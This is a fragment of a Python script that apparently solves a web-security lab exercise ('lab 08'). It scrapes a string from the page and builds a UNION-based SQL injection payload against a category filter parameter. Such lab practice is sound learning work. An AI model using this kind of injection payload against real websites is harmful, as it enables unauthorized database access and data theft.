...
def sql_injection_test(url, use_proxy=False):
    try:
        ...
        string_data = soup.find('div', class_= "title-container").find_next('p').text.split()[6].strip("'")
        print(f"String Data: {string_data}")
        
        payload = f"filter?category=Gifts' UNION SELECT null,'{string_data}',null--"
...
def main():
    parser = argparse.ArgumentParser(description='SQL Injection for lab 08')
